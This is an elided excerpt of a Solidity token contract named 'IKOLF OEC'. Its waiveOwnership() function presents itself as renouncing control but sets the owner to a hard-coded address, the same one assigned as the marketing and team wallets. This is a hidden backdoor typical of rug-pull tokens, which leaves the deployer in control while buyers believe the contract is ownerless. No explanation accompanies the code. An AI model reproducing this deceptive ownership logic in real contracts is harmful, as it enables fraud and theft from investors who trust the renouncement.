...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xaBF90AC40EE6A919a7DEcee102cCe7E2a9151957);
    }
...
contract IKOLFOEC is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "IKOLF OEC";
    string private _symbol = "IOEC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xaBF90AC40EE6A919a7DEcee102cCe7E2a9151957);
    address payable public teamWalletAddress = payable(0xaBF90AC40EE6A919a7DEcee102cCe7E2a9151957);
